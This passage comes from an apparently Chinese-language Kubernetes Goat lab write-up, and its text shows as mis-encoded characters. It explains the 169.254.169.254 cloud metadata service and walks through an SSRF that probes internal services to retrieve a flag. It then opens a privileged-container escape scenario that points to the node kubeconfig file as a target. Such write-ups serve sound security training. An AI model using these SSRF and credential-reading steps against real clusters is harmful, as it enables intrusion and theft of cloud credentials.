<h4 id="169-254-169-254åœ°å€ï¼š"><a href="#169-254-169-254åœ°å€ï¼š" class="headerlink" title="169.254.169.254åœ°å€ï¼š"></a>169.254.169.254åœ°å€ï¼š</h4><p>169.254.169.254æ˜¯åŠ¨æ€é…ç½®çš„é“¾è·¯æœ¬åœ°IPv4åœ°å€ã€‚å®ƒåªåœ¨ä¸€ä¸ªç½‘æ®µä¸Šæœ‰æ•ˆï¼Œå¹¶ä¸”ä¸èƒ½è¢«è·¯ç”±ã€‚å¤§å¤šæ•°äº‘æä¾›å•†ä½¿ç”¨æ­¤åœ°å€ä¸ºå®ä¾‹æä¾›è®¡ç®—å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬AWSã€GCP Azureã€Digital Oceanç­‰ä¸»è¦æä¾›å•†ã€‚</p>
<ul>
<li><strong>é“¾è·¯æœ¬åœ°åœ°å€ï¼ˆLink-Local Addressï¼‰</strong></li>
</ul>
<p><strong>å®šä¹‰</strong>ï¼šé“¾è·¯æœ¬åœ°åœ°å€æ˜¯ç”¨äº<strong>åŒä¸€ç‰©ç†æˆ–è™šæ‹Ÿç½‘ç»œæ®µå†…é€šä¿¡</strong>çš„IPåœ°å€ï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®æˆ–ä¾èµ–DHCPæœåŠ¡å™¨ã€‚è¿™ç±»åœ°å€å±äº<strong>169.254.0.0/16</strong>èŒƒå›´ï¼Œç”±è®¾å¤‡åœ¨æ— æ³•è·å–IPæ—¶è‡ªåŠ¨åˆ†é…ã€‚</p>
<ul>
<li>ç‰¹ç‚¹ï¼š</li>
</ul>
<p><strong>ä¸å¯è·¯ç”±</strong>ï¼šæ— æ³•é€šè¿‡è·¯ç”±å™¨è®¿é—®å…¶ä»–ç½‘ç»œï¼Œä»…é™æœ¬åœ°ç½‘ç»œä½¿ç”¨ã€‚</p>
<p><strong>åŠ¨æ€åˆ†é…</strong>ï¼šæ— éœ€äººå·¥å¹²é¢„ï¼Œé€‚åˆä¸´æ—¶æˆ–å°é—­ç¯å¢ƒã€‚</p>
<ul>
<li><strong>äº‘æœåŠ¡ä¸­çš„ç‰¹æ®Šç”¨é€”</strong></li>
</ul>
<p><strong>å…ƒæ•°æ®æœåŠ¡ï¼ˆMetadata Serviceï¼‰</strong>ï¼š</p>
<p>1ï¼‰åŠŸèƒ½ï¼šäº‘æœåŠ¡å™¨å®ä¾‹ï¼ˆå¦‚è™šæ‹Ÿæœºï¼‰é€šè¿‡è®¿é—®æ­¤åœ°å€ï¼Œè·å–è‡ªèº«åŠ¨æ€ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><p>å®ä¾‹IDã€ä¸»æœºåã€åŒºåŸŸç­‰åŸºç¡€ä¿¡æ¯ã€‚</p>
</li>
<li><p>ä¸´æ—¶å®‰å…¨å‡­è¯ï¼ˆå¦‚AWSçš„STS Tokenï¼‰ã€‚</p>
</li>
<li><p>ç”¨æˆ·å¯åŠ¨æ—¶æ³¨å…¥çš„è‡ªå®šä¹‰è„šæœ¬ï¼ˆUser Dataï¼‰ã€‚</p>
</li>
<li><p>ç½‘ç»œé…ç½®ï¼ˆå…¬ç½‘IPã€ç§æœ‰IPç­‰ï¼‰ã€‚</p>
</li>
<li><p><strong>è®¿é—®æ–¹å¼</strong>ï¼šé€šè¿‡HTTPåè®®è®¿é—®ï¼Œä¾‹å¦‚ï¼š</p>
</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://169.254.169.254/latest/meta-data/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2ï¼‰<strong>å®‰å…¨æ€§</strong>ï¼š</p>
<ul>
<li><strong>ä»…é™å®ä¾‹å†…éƒ¨è®¿é—®</strong>ï¼šå¤–éƒ¨ç½‘ç»œæˆ–ç”¨æˆ·æ— æ³•ç›´æ¥è¯·æ±‚è¯¥åœ°å€ï¼Œé¿å…äº†æ•æ„Ÿæ•°æ®æ³„éœ²ã€‚</li>
<li><strong>çŸ­æš‚æ€§å‡­è¯</strong>ï¼šæä¾›ä¸´æ—¶ä»¤ç‰Œè€Œéé•¿æœŸå¯†é’¥ï¼Œé™ä½å®‰å…¨é£é™©ã€‚</li>
</ul>
</blockquote>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨169.254.169.254è®¿é—®é»˜è®¤çš„å®ä¾‹å…ƒæ•°æ®æœåŠ¡ã€‚æˆ‘ä»¬è¿˜éœ€è¦ç¡®å®šæœåŠ¡ä½¿ç”¨å“ªä¸ªäº‘æä¾›å•†æ¥è¿è¡Œæ­¤è®¡ç®—ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç‰¹å®šçš„å¤´ä¿¡æ¯å’ŒæŸ¥è¯¢ã€‚å¦‚æœè¿™ä¸æ˜¯æ‰˜ç®¡åœ¨äº‘æä¾›å•†ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è·³è¿‡å®ƒï¼Œå¹¶è½¬ç§»åˆ°å†…éƒ¨æœåŠ¡æŸ¥è¯¢ï¼Œå¦‚å…¶ä»–å¾®æœåŠ¡å’ŒKubernetesé›†ç¾¤ä¸­çš„å†…éƒ¨æœåŠ¡ã€‚</p>
<ul>
<li>ä¿¡æ¯æ”¶é›†</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥ä»æšä¸¾å’Œä¾¦å¯Ÿå¼€å§‹ï¼Œæ ¹æ®ç°æœ‰ä¿¡æ¯äº†è§£å½“å‰å®ä¾‹åŠå…¶ä»–ç½‘ç»œä¸­è¿è¡Œçš„æœåŠ¡ã€‚</p>
<p>æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŸ¥è¯¢ä¸åŒç«¯å£å’Œåœ°å€æ¥æ£€æŸ¥å½“å‰å®¹å™¨/Podä¸­æ˜¯å¦è¿è¡Œç€å…¶ä»–æœåŠ¡ã€‚è®©æˆ‘ä»¬ç”¨ GET æ–¹æ³•æŸ¥è¯¢åŒä¸€å®¹å™¨ä¸­çš„ 5000 ç«¯å£ <code>http://127.0.0.1:5000</code>ã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2010.36.56.png" style="zoom:40%;">

<p>å¯ä»¥é€šè¿‡SSRFæ¼æ´çœ‹åˆ°å½“å‰å®¹å™¨æ­£åœ¨è¿è¡ŒæŸä¸ªWebæœåŠ¡å¹¶è¿”å›äº†HTTPå“åº”ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ç°åœ¨æŒæ¡äº†æ›´å¤šæ•°æ®/ä¿¡æ¯ï¼Œå¯ä»¥è¿›ä¸€æ­¥æ¨è¿›æ”»å‡»ï¼Œä»¥è·å–Kubernetesç½‘ç»œæœåŠ¡å†…éƒ¨çš„æ›´æ·±å±‚è®¿é—®æƒé™ã€‚</p>
<ul>
<li>è®¿é—®å†…éƒ¨æœåŠ¡ã€ä»¥ä¸‹å†…å®¹åœ¨minikube-goaté¶åœºæ— æ³•å¤ç°ï¼Œåœ¨metarget-goaté¶åœºå¯ä»¥å¤ç°ã€‘</li>
</ul>
<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é›†ç¾¤å†…éƒ¨æœ‰ä¸€ä¸ªä»…é™å†…éƒ¨è®¿é—®çš„æœåŠ¡å«åšmetadata-dbï¼Œæˆ‘ä»¬å‘èµ·æŸ¥è¯¢çœ‹çœ‹æ˜¯å¦èƒ½è·å–æ›´å¤šæœ‰ç”¨ä¿¡æ¯<code>http://metadata-db</code>ã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2011.18.22.png" style="zoom:30%;">

<p>åœ¨éå†å®Œæ‰€æœ‰é”®å€¼åï¼Œæœ€ç»ˆæˆ‘ä»¬å¯ä»¥åœ¨<code>http://metadata-db/latest/secrets/kubernetes-goat</code>ç«¯ç‚¹å¤„å‘ç°ä¸€ä¸ªæ ‡å¿—ã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2011.21.38.png" style="zoom:40%;">

<p>æˆ‘ä»¬å¯ä»¥å¯¹è¿”å›/è·å–çš„base64ç¼–ç æ ‡å¿—è¿›è¡Œè§£ç ä»¥æŸ¥çœ‹ä¿¡æ¯</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI="</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2011.23.03.png" style="zoom:50%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.07.38.png" style="zoom:50%;">

<p><code>flagï¼šk8s-goat-ca90ef85db7a5aef0198d02fb0df9cab</code></p>
<p>æœ€ç»ˆæˆåŠŸé€šè¿‡ssrfè®¿é—®åˆ°k8sé›†ç¾¤å†…éƒ¨çš„æ•°æ®æœåŠ¡çš„æ•°æ®ã€‚</p>
<h2 id="3-4-Container-escape-to-the-host-systemâ“"><a href="#3-4-Container-escape-to-the-host-systemâ“" class="headerlink" title="3.4 Container escape to the host systemâ“"></a>3.4 Container escape to the host systemâ“</h2><p>é€šè¿‡Kubernetes ä¸­çš„å®¹å™¨é€ƒé€¸æ¥è®¿é—®å®¿ä¸»æœºç³»ç»Ÿã€‚</p>
<h3 id="3-4-1-åœºæ™¯ä»‹ç»"><a href="#3-4-1-åœºæ™¯ä»‹ç»" class="headerlink" title="3.4.1 åœºæ™¯ä»‹ç»"></a>3.4.1 åœºæ™¯ä»‹ç»</h3><p>è¿™ä¸ªåœºæ™¯å±•ç¤ºäº†Kubernetesã€å®¹å™¨ç¯å¢ƒå’Œä¸€èˆ¬å®‰å…¨é¢†åŸŸä¸­å¸¸è§çš„é…ç½®é”™è¯¯å’Œä¸€ä¸ªå®¹æ˜“å‡ºé”™çš„å®‰å…¨é—®é¢˜ã€‚ä¸å¿…è¦çš„ç‰¹æƒæ€»æ˜¯ä¼šè®©å®‰å…¨æ€§æ›´å·®ï¼Œåœ¨å®¹å™¨å’ŒKubernetesçš„ä¸–ç•Œä¸­å°¤å…¶å¦‚æ­¤ã€‚æ ¹æ®é›†ç¾¤ç¯å¢ƒå’Œèµ„æºçš„é…ç½®å’Œè®¾ç½®ï¼Œè¿˜å¯ä»¥å°†æ­¤åœºæ™¯åº”ç”¨åˆ°å®¹å™¨ä¹‹å¤–çš„å…¶ä»–ç³»ç»Ÿå’ŒæœåŠ¡ã€‚è¿™ä¸ªåœºæ™¯å›´ç»•ä¸€ä¸ªç‰¹æƒå®¹å™¨é€ƒé€¸æ¥è®¿é—®ä¸»æœºç³»ç»Ÿã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2015.03.12.png" style="zoom:40%;">

<p>å®è·µç›®çš„ï¼š</p>
<p>1ã€èƒ½å¤Ÿåˆ©ç”¨å®¹å™¨å¹¶é€ƒç¦»dockerå®¹å™¨ã€‚</p>
<p>2ã€äº†è§£å¦‚ä½•æµ‹è¯•å’Œåˆ©ç”¨é…ç½®é”™è¯¯çš„å®¹å™¨å’Œç‰¹æƒå®¹å™¨ã€‚</p>
<p>3ã€äº†è§£å¸¸è§çš„é”™è¯¯é…ç½®ä»¥åŠå®ƒä»¬å¯¹å®¹å™¨ã€Kuberneteså’Œé›†ç¾¤ç¯å¢ƒå¯èƒ½é€ æˆçš„ç ´åã€‚</p>
<p>å¤§å¤šæ•°ç›‘æ§ã€è¿½è¸ªå’Œè°ƒè¯•è½¯ä»¶è¿è¡Œæ—¶éƒ½éœ€è¦é¢å¤–çš„æƒé™å’Œèƒ½åŠ›ã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œå°†çœ‹åˆ°ä¸€ä¸ªå…·å¤‡ç‰¹æƒçš„Podï¼Œå…¶ä¸­åŒ…æ‹¬HostPathè®¿é—®æƒé™ï¼Œè¿™å°†ä½¿ä½ èƒ½å¤Ÿè®¿é—®ä¸»æœºç³»ç»Ÿï¼Œå¹¶é€šè¿‡èŠ‚ç‚¹çº§é…ç½®å®ç°å¯¹æ•´ä¸ªé›†ç¾¤çš„å®Œå…¨æ§åˆ¶ã€‚</p>
<h3 id="3-4-2-åœºæ™¯è®¿é—®"><a href="#3-4-2-åœºæ™¯è®¿é—®" class="headerlink" title="3.4.2 åœºæ™¯è®¿é—®"></a>3.4.2 åœºæ™¯è®¿é—®</h3><p><code>http://192.168.52.13:1233/</code></p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2015.15.39.png" style="zoom:67%;">

<p>ç›®æ ‡ï¼š</p>
<ul>
<li>1ï¼‰åˆ©ç”¨å¯ç”¨çš„é”™è¯¯é…ç½®é€ƒé€¸å‡ºä¸»æœºç³»ç»Ÿä¸Šæ­£åœ¨è¿è¡Œçš„dockerå®¹å™¨ã€‚</li>
<li>2ï¼‰ä½¿ç”¨ä¸»æœºç³»ç»Ÿçº§è®¿é—®æ¥è·å¾—å…¶ä»–èµ„æºè®¿é—®ï¼Œå¦‚æœå¯èƒ½çš„è¯ï¼Œç”šè‡³å¯ä»¥è·å–è¶…è¶Šå®¹å™¨çº§ã€èŠ‚ç‚¹çº§å’Œé›†ç¾¤çº§çš„è®¿é—®ã€‚</li>
</ul>
<blockquote>
<p>TIPï¼šè®¿é—®ä¸»æœºç³»ç»Ÿå¹¶è·å¾—èŠ‚ç‚¹çº§åˆ«çš„kubeconfigæ–‡ä»¶/var/lib/kubelet/kubeconfigï¼Œå¹¶ä½¿ç”¨è·å¾—çš„é…ç½®æŸ¥è¯¢KubernetesèŠ‚ç‚¹ã€‚</p>
</blockquote>
<h3 id="3-4-3-å®è·µ"><a href="#3-4-3-å®è·µ" class="headerlink" title="3.4.3 å®è·µ"></a>3.4.3 å®è·µ</h3><ul>
<li>ä¿¡æ¯åˆ†æï¼ˆcapsh â€“printã€mountï¼‰</li>
</ul>
<blockquote>
<h4 id="capsh"><a href="#capsh" class="headerlink" title="capsh"></a>capsh</h4><p><strong>Linux Capabilities</strong>ï¼šå°† root æƒé™æ‹†åˆ†ä¸ºç»†ç²’åº¦çš„èƒ½åŠ›ï¼Œé¿å…è¿›ç¨‹æ‹¥æœ‰ä¸å¿…è¦çš„ç‰¹æƒ</p>
<p><code>capsh --print</code> æ˜¯ä¸€ä¸ªç”¨äºæŸ¥è¯¢å½“å‰è¿›ç¨‹çš„ <strong>capabilitiesï¼ˆèƒ½åŠ›ï¼‰</strong> çŠ¶æ€çš„å‘½ä»¤ã€‚<code>capsh</code> æ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œå±äº <code>libcap</code> å·¥å…·é›†çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºç®¡ç†å’Œè°ƒè¯•è¿›ç¨‹çš„ capabilitiesã€‚</p>
<p>å…¸å‹ç”¨é€”ï¼š</p>
<ol>
<li><strong>è°ƒè¯• capabilities</strong><br>æ£€æŸ¥è¿›ç¨‹æ˜¯å¦å…·å¤‡æŸäº›ç‰¹æƒèƒ½åŠ›ï¼ˆå¦‚ <code>cap_net_admin</code> ç®¡ç†ç½‘ç»œæˆ– <code>cap_sys_admin</code> æ‰§è¡Œç³»ç»Ÿç®¡ç†æ“ä½œï¼‰ã€‚</li>
<li><strong>éªŒè¯å®‰å…¨é…ç½®</strong><br>ç¡®è®¤å®¹å™¨æˆ–æ²™ç®±ç¯å¢ƒçš„èƒ½åŠ›é™åˆ¶æ˜¯å¦æŒ‰é¢„æœŸç”Ÿæ•ˆï¼ˆä¾‹å¦‚ Docker é»˜è®¤ä¸¢å¼ƒéƒ¨åˆ†èƒ½åŠ›ï¼‰ã€‚</li>
<li><strong>è„šæœ¬ä¸­æ£€æŸ¥æƒé™</strong><br>åœ¨è„šæœ¬ä¸­åˆ¤æ–­å½“å‰ç”¨æˆ·/è¿›ç¨‹æ˜¯å¦å…·å¤‡ç‰¹å®šèƒ½åŠ›ï¼Œè€Œéä¾èµ– root èº«ä»½ã€‚</li>
</ol>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">capsh <span class="token parameter variable">--print</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@system-monitor-deployment-d4cbb9957-q4hlf:/<span class="token comment"># capsh --print</span>
Current: <span class="token operator">=</span>ep
Bounding <span class="token builtin class-name">set</span> <span class="token operator">=</span>cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Ambient <span class="token builtin class-name">set</span> <span class="token operator">=</span>
Current IAB:
